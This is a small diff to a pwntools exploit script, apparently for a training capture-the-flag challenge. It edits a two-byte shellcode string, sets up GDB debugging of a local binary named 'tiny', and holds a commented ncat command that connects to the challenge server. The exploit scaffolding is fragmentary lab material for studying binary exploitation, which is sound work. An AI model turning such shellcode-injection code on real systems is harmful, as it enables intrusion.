@@ -2,8 +2,7 @@ from pwn import *
 
 COMMANDS = """
 """
-shellcode = b"\x50"
-
+shellcode = b"\x50\xC3"
 #ncat --ssl back-to-shell.training.offensivedefensive.it 8080
 if args.GDB:
     p = gdb.debug("./tiny", gdbscript=COMMANDS)
